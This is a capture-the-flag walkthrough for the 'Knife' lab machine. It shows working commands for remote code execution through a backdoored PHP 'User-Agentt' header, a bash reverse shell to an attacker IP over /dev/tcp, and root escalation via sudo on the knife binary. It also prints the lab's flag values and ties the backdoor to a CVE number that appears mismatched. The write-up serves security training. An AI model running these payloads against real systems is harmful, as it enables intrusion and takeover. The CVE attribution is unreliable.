<img width="701" height="667" alt="image" src="https://github.com/user-attachments/assets/aaef6925-4100-47a9-bcb6-4150715e13cb" />

## Enumeration

First, I scanned the target with Nmap:

> How many TCP ports are open on Knife? = `2`
> 

```bash
nmap -p- -T4 -A 10.129.202.74
```

**Findings:**

- **22/tcp** → SSH (OpenSSH 8.2p1)
- **80/tcp** → HTTP (Apache/2.4.41, Ubuntu)

<img width="905" height="501" alt="image" src="https://github.com/user-attachments/assets/81200bdc-dae4-413d-ad27-26facd188572" />

> What version of PHP is running on the webserver?
> 

## Web Enumeration

Checking the HTTP headers:

```bash
curl -I http://10.129.202.74
```

<img width="896" height="174" alt="image" src="https://github.com/user-attachments/assets/6b2c42e2-8c6f-48a9-843e-398aeb8ddd9e" />

`8.1.0-dev`

This version is **vulnerable to a User-Agentt header exploit** (CVE-2021-21707).

> What HTTP request header can be added to get code execution in this version of PHP?
> 

make some googling 

<img width="710" height="490" alt="image" src="https://github.com/user-attachments/assets/0d1834e5-2a88-48d6-b1ce-737505d3a321" />

[PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/49933)

`User-Agentt`

                                                                                     

> What user is the web server running as?
> 

## Exploitation

We can achieve RCE with:

```bash
curl http://10.129.202.74/index.php \
-H "User-Agentt: zerodiumsystem('id');"
```

<img width="896" height="326" alt="image" src="https://github.com/user-attachments/assets/65bac119-62a0-4cb8-b6fe-01d093aeccba" />

The webserver runs as **james**.

> Submit the flag located in the james user's home directory.
> 

To grab the user flag:

```bash
curl http://10.129.202.74/index.php \
-H "User-Agentt: zerodiumsystem('cat /home/james/user.txt');"
```

<img width="907" height="303" alt="image" src="https://github.com/user-attachments/assets/4a70486b-a48d-4151-9b80-3e811c2fa564" />

Flag:

```
eb047cb57550d39711156b687464b782
```

## Shell Access

I set up a reverse shell:

```bash
nc -lvnp 4444
```

Then triggered it with:

```bash
curl http://10.129.202.74/index.php \
-H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.12/4444 0>&1\"');"
```

Now I have a shell as `james`.

<img width="1801" height="110" alt="image" src="https://github.com/user-attachments/assets/1eea591c-7837-44ba-8c7c-9e87fc40715f" />

> What is the full path to the binary on this machine that james can run as root?
> 

<img width="902" height="138" alt="image" src="https://github.com/user-attachments/assets/9a7d90f8-b3be-449f-917b-8f1239882e00" />

(root) NOPASSWD: **/usr/bin/knife**

The `knife` binary can be abused to get a root shell:

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

> Submit the flag located in root's home directory.
><img width="901" height="97" alt="image" src="https://github.com/user-attachments/assets/7f93efed-dcb4-45ec-8a87-ed6f1b568dd7" />
```bash
ed0a5ad2e9c3b623485370087c45a6da```
